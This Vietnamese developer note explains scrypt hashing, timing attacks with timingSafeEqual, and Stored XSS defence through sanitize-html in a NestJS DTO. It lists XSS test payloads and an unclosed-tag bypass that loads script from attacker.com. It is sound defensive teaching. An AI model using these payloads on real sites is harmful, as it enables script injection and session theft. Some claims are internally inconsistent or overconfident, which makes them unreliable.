---
tags: [type/concept, topic/tech, status/permanent]
date: 2026-07-05
aliases:
  [
    Kiem thu bao mat scrypt va XSS,
    Security Testing and XSS Prevention,
    Timing Attacks timingSafeEqual,
    Scrypt GPU Resistance,
  ]
---

# Hướng Dẫn Kiểm Thử Bảo Mật scrypt và Phòng Ngừa XSS (Security Testing and XSS Prevention)

## TL;DR

Tài liệu này cung cấp kiến thức nền tảng và hướng dẫn thực hành kiểm thử bảo mật cho hai tầng phòng ngự chính của hệ thống Auth: **Mã hóa mật khẩu an toàn chống brute-force/timing attacks (Scrypt)** và **Lọc dữ liệu đầu vào chống lỗ hổng Stored XSS**.

---

## 1. Thuật Toán Mã Hóa Mật Khẩu (Scrypt) & Phòng Chống Tấn Công Dò Thời Gian

Mật khẩu của người dùng được bảo vệ thông qua thuật toán `scrypt` tích hợp trong Node.js (`node:crypto`).

### scrypt Chống Lại Tấn Công Brute-force Bằng GPU/ASIC Như Thế Nào?

Khác với các thuật toán băm (hashing) thông thường như MD5 hay SHA-256 (vốn cực kỳ nhanh và dễ dàng bị brute-force hàng tỷ lần/giây bằng GPU hoặc chip ASIC chuyên dụng), `scrypt` được thiết kế có tính chất **Memory-Hard** (yêu cầu dung lượng bộ nhớ RAM lớn) và **Time-Hard** (tốn nhiều thời gian xử lý của CPU).

- Khi chạy brute-force, tin tặc phải phân bổ một lượng RAM lớn cho mỗi luồng thử nghiệm. Điều này làm tăng chi phí phần cứng lên gấp hàng ngàn lần và làm chậm tốc độ thử mật khẩu một cách đáng kể, khiến việc brute-force trở nên bất khả thi về mặt kinh tế.

### Tấn Công Dò Thời Gian (Timing Attack) & Giải Pháp `timingSafeEqual`

#### 🔐 Ẩn dụ thực tế: Két sắt mật mã

Hãy tưởng tượng bạn đang cố gắng bẻ khóa một chiếc két sắt có mã số gồm 4 chữ số (ví dụ: `4-7-2-9`) bằng cách lắng nghe âm thanh phản hồi:

1. **Két sắt thông thường (Short-circuit):**
   - Bạn nhập số đầu tiên: Nếu là `1` (sai), két sắt lập tức phát tiếng **kêu bíp báo lỗi ngay sau 0.1 giây**.
   - Nếu bạn nhập đúng số `4`: Két sắt khớp nấc khóa đầu tiên, nó di chuyển một chốt cơ học bên trong và mất **0.5 giây** để sẵn sàng kiểm tra số thứ hai.
   - **Hậu quả:** Kẻ trộm chỉ cần thử từ `0` đến `9`. Số nào làm két sắt phản hồi **chậm hơn** (0.5 giây thay vì 0.1 giây) chính là số đúng! Bằng cách đo thời gian phản hồi, kẻ trộm đoán được số đầu tiên là `4`, sau đó là `7`, rồi `2`, và `9`. Thay vì phải thử $10^4 = 10,000$ tổ hợp ngẫu nhiên, chúng chỉ cần tối đa $10 \times 4 = 40$ lần thử để mở két sắt!

2. **Két sắt an toàn tuyệt đối (Constant-time):**
   - Dù bạn nhập đúng hay sai bao nhiêu số, két sắt luôn luôn chạy hết chu trình kiểm tra cơ học bên trong và **luôn luôn phát tiếng bíp báo kết quả sau đúng 2.0 giây**.
   - **Kết quả:** Kẻ trộm không thể nghe hay đo lường bất kỳ sự khác biệt nào về thời gian để đoán từng số. Cách duy nhất là bẻ khóa ngẫu nhiên (Brute-force) toàn bộ 10,000 tổ hợp.

---

#### 💻 Trên tầng Code: So sánh chuỗi trong Lập trình

Khi so sánh hai chuỗi ký tự bằng toán tử `===` thông thường trong JavaScript, công cụ JS Engine sẽ tối ưu hóa hiệu năng bằng cách so sánh từng ký tự từ trái qua phải (Short-circuit):

```typescript
function compareClassic(stored: string, input: string): boolean {
  if (stored.length !== input.length) return false;
  for (let i = 0; i < stored.length; i++) {
    if (stored[i] !== input[i]) {
      return false; // Trả về false NGAY LẬP TỨC khi gặp ký tự đầu tiên sai
    }
  }
  return true;
}
```

Giả sử mật khẩu đúng trong DB là: `abcde`

- **Request 1 (Tin tặc gửi: `12345`):** Ký tự đầu tiên `'1' !== 'a'` -> Trả về `false` ngay lập tức. CPU chỉ xử lý mất 1 chu kỳ.
- **Request 2 (Tin tặc gửi: `a2345`):** Ký tự `'a' === 'a'` khớp -> Chuyển sang ký tự thứ hai `'2' !== 'b'` -> Trả về `false`. CPU xử lý mất 2 chu kỳ.
- **Request 3 (Tin tặc gửi: `ab345`):** Khớp 2 ký tự đầu, ký tự thứ ba sai -> Trả về `false`. CPU xử lý mất 3 chu kỳ.

Mặc dù sự chênh lệch thời gian giữa 1 chu kỳ và 3 chu kỳ CPU chỉ là vài **phần tỷ giây (nanoseconds)**, tin tặc có thể gửi hàng triệu request liên tiếp và dùng thuật toán thống kê toán học lọc nhiễu mạng để đoán ra chính xác từng ký tự của chuỗi mật khẩu băm!

---

#### 🛡️ Giải pháp: So sánh đồng nhất thời gian (`timingSafeEqual`)

Hàm `timingSafeEqual` thực hiện phép so sánh Bitwise XOR trên toàn bộ chiều dài của Buffer nhị phân mà không có cơ chế dừng sớm:

```typescript
function timingSafeCompare(stored: Buffer, input: Buffer): boolean {
  let result = 0;
  for (let i = 0; i < stored.length; i++) {
    result |= stored[i] ^ input[i]; // Chạy qua HẾT chuỗi, không dừng lại giữa chừng!
  }
  return result === 0;
}
```

- Dù ký tự đầu tiên có đúng hay sai, vòng lặp **vẫn tiếp tục chạy qua toàn bộ các ký tự còn lại** của chuỗi rồi mới trả về kết quả cuối cùng.
- **Kết quả:** Thời gian xử lý của CPU cho mọi request là **y hệt nhau** (Constant-time). Tin tặc hoàn toàn không thể khai thác được bất kỳ thông tin nào từ thời gian phản hồi của Server.

---

## 2. Lỗ Hổng Cross-Site Scripting (XSS) & Cách Phòng Ngừa

### XSS Là Gì?

**Cross-Site Scripting (XSS)** là lỗ hổng xảy ra khi ứng dụng nhận dữ liệu không an toàn từ người dùng và hiển thị nó lên giao diện web mà không lọc bỏ mã script độc hại. Lúc này, trình duyệt của người dùng khác sẽ tự động thực thi đoạn mã Javascript của tin tặc.

#### Phân loại chính

1. **Stored XSS (XSS lưu trữ):** Mã độc được gửi lên server và lưu cố định vào Database (ví dụ: họ tên user là `<script>cướp_cookie()</script>`). Mỗi khi có ai đó vào trang quản trị xem thông tin user này, trình duyệt của họ sẽ tự động chạy script độc hại.
2. **Reflected XSS (XSS phản xạ):** Mã độc nằm trong đường dẫn URL (ví dụ: `?search=<script>...</script>`) và thực thi ngay khi render trang.
3. **DOM-based XSS:** Lỗi xảy ra hoàn toàn ở phía client do mã JS đọc dữ liệu không an toàn và ghi trực tiếp vào DOM (`document.write` hoặc `innerHTML`).

---

### Các Payload XSS Thực Tế Để Tự Kiểm Thử Hệ Thống

Để thử nghiệm kiểm thử hộp đen (Black-box testing) hoặc viết Unit Test, bạn có thể gửi các Payload nguy hiểm sau vào các trường như `fullName`, `email`:

1. **Thẻ Script cơ bản (Basic Tag):**

   ```html
   <script>
     alert("XSS");
   </script>
   ```

2. **Kích hoạt qua sự kiện lỗi hình ảnh (Bypass bộ lọc thẻ script):**

   ```html
   <img src="đường_dẫn_lỗi" onerror="alert('XSS')" />
   ```

3. **Sử dụng thẻ SVG (Thường dùng để bypass WAF):**

   ```html
   <svg/onload=alert('XSS')>
   ```

4. **JavaScript URI (Tiêm vào thuộc tính liên kết):**

   ```html
   <a href="javascript:alert('XSS')">Click here</a>
   ```

---

### Cơ Chế Phòng Ngự Stored XSS Của Dự Án

Hệ thống của chúng ta ngăn chặn hoàn toàn Stored XSS bằng bộ lọc ở cổng vào (DTO Validation Pipe):

```typescript
// src/common/utils/sanitize.util.ts
import sanitizeHtml from "sanitize-html";

export function sanitizeString(value: unknown): unknown {
  if (typeof value !== "string") return value;
  // Lọc sạch toàn bộ thẻ HTML bằng thư viện sanitize-html chuyên dụng
  return sanitizeHtml(value, {
    allowedTags: [],
    allowedAttributes: {},
  }).trim();
}
```

#### Áp dụng vào DTO

```typescript
export class RegisterDto {
  @Transform(({ value }) => sanitizeString(value)) // Tự động dọn dẹp đầu vào
  @IsString()
  fullName!: string;
}
```

- **Cách hoạt động:** Khi người dùng gửi lên `fullName: "<script>alert(1)</script>"`, trước khi đi vào logic nghiệp vụ và lưu vào DB, DTO sẽ tự động dọn dẹp giá trị này thành chuỗi rỗng `""` (bởi vì `sanitize-html` là bộ phân tích cú pháp thực thụ, nó xóa bỏ toàn bộ thẻ `<script>` lẫn nội dung mã thực thi bên trong thẻ, thay vì giữ lại text như bộ lọc regex thô sơ trước đó) -> **Hệ thống an toàn tuyệt đối**.

---

### 🚨 Giải quyết các lỗ hổng của Regex tự viết thông qua `sanitize-html`

Ban đầu, dự án sử dụng biểu thức Regex đơn giản `/<[^>]*>/g`. Tuy nhiên, **biểu thức Regex tự viết luôn có các lỗ hổng bypass nghiêm trọng** mà chỉ có các thư viện phân tích cú pháp HTML thực thụ (HTML Parser) như `sanitize-html` mới có thể giải quyết triệt để:

#### 1. Thẻ HTML không đóng (Unclosed Tag Bypass)

- **Vấn đề với Regex cũ:** Tin tặc gửi chuỗi `<script src=http://attacker.com/xss.js` (không có ký tự đóng `>`). Regex cũ bỏ qua hoàn toàn do thiếu `>`, nhưng trình duyệt của nạn nhân vẫn tự đóng thẻ và chạy script độc hại.
- **Giải pháp với `sanitize-html`:** Thư viện sử dụng bộ phân tích cú pháp HTML thực thụ (`htmlparser2`) nên nó nhận biết được thẻ `<script` chưa đóng và **quét sạch hoàn toàn** chuỗi này thành chuỗi rỗng `""` -> **Đã khắc phục**.

#### 2. Thẻ HTML lồng nhau (Nested Tag Bypass)

- **Vấn đề với Regex cũ:** Tin tặc gửi chuỗi `<scr<iframe>ipt>alert(1)</iframe>`. Bộ lọc cũ chỉ quét một lần nên khi xóa thẻ `<iframe>`, hai nửa còn lại chập vào nhau tạo thành thẻ `<script>` mới chưa được làm sạch.
- **Giải pháp với `sanitize-html`:** Quá trình phân tích cú pháp dạng cây (DOM-like tree traversal) giúp phát hiện và phá vỡ cấu trúc lồng nhau này, đảm bảo không sinh ra các thẻ mới sau khi lọc -> **Đã khắc phục**.

#### 🛡️ Khuyến nghị cho Production: Sử dụng thư viện chuyên dụng

Dự án hiện tại của chúng ta đã được nâng cấp lên **`sanitize-html`** làm bộ dọn dẹp HTML chuẩn công nghiệp:

- Nó ngăn chặn triệt để tất cả các lỗ hổng bypass của biểu thức Regex cũ bằng bộ phân tích cú pháp thực thụ.
- Chúng ta cấu hình `{ allowedTags: [], allowedAttributes: {} }` để đảm bảo làm sạch tuyệt đối mọi thẻ HTML đối với các trường văn bản thường (`fullName`, `email`).

### 🚨 Ranh giới phòng thủ: Các Vector XSS không dùng Thẻ HTML (Non-Tag XSS)

Hàm `sanitizeString` sử dụng biểu thức chính quy (Regex) để xóa các thẻ HTML nằm trong cặp ký tự `<` và `>`. Tuy nhiên, **tin tặc có thể khai thác lỗ hổng XSS mà không cần dùng bất kỳ thẻ HTML nào**. Dưới đây là 3 vector XSS phi-thẻ phổ biến và cách phòng chống bắt buộc:

#### 1. JavaScript URIs (Thuộc tính liên kết)

- **Kịch bản:** Người dùng được phép nhập link trang web cá nhân, và hệ thống render ra thẻ `<a>`: `<a href="USER_INPUT">Trang cá nhân</a>`.
- **Payload:** Tin tặc nhập chuỗi `javascript:alert('XSS')`. Chuỗi này **không chứa thẻ `<` hay `>`**, nên `sanitizeString` giữ nguyên. Khi nạn nhân click vào liên kết, trình duyệt của họ sẽ chạy script độc hại.
- **Cách phòng chống:** Ở Backend, DTO kiểm định URL phải sử dụng `@IsUrl()` hoặc viết một custom validator giới hạn URL bắt buộc phải bắt đầu bằng giao thức an toàn `http://` hoặc `https://`.

#### 2. Attribute Injection (Phá vỡ thuộc tính HTML)

- **Kịch bản:** Dữ liệu người dùng được nhét vào giá trị thuộc tính HTML mà không thoát ký tự đặc biệt: `<input type="text" value="USER_INPUT">`.
- **Payload:** Tin tặc nhập chuỗi `" autofocus onfocus="alert('XSS')`. Chuỗi này cũng **không chứa thẻ HTML nào**, nên đi qua bộ lọc `sanitizeString` an toàn. Khi được đưa vào HTML, thẻ biến thành `<input type="text" value="" autofocus onfocus="alert('XSS')">`. Thuộc tính `onfocus` sẽ tự động kích hoạt Javascript.
- **Cách phòng chống:** Tầng **Frontend** (hoặc template engine) bắt buộc phải tự động mã hóa ký tự HTML (HTML Entity Escaping), chuyển đổi các dấu nháy kép `"` thành `&quot;`, dấu nháy đơn `'` thành `&#x27;`, khiến tin tặc không thể thoát khỏi cặp nháy bao quanh thuộc tính.

#### 3. Script Context Injection (Nhúng trực tiếp vào script)

- **Kịch bản:** Backend hoặc Frontend nhúng trực tiếp dữ liệu thô vào trong một thẻ `<script>` có sẵn: `<script>const username = 'USER_INPUT';</script>`.
- **Payload:** Tin tặc nhập chuỗi `'; alert('XSS'); //`. Không có thẻ HTML nào được dùng, nhưng mã độc vẫn chạy do phá vỡ cấu trúc chuỗi JavaScript.
- **Cách phòng chống:** Tuyệt đối không nhúng trực tiếp dữ liệu thô vào ngữ cảnh script. Hãy truyền dữ liệu thông qua thuộc tính `data-*` của HTML đã được mã hóa thực thể hoặc sử dụng một API Endpoint trả về JSON an toàn.

---

## Related Notes & MOC Backlinks

- Thư mục MOC: [[000_Ticket_Booking_MOC]]
- Cơ chế Custom Validation Decorator: [[Custom_Validation_Constraint_Match]]
- Đặc tả DTO đăng ký: [[register.dto]]
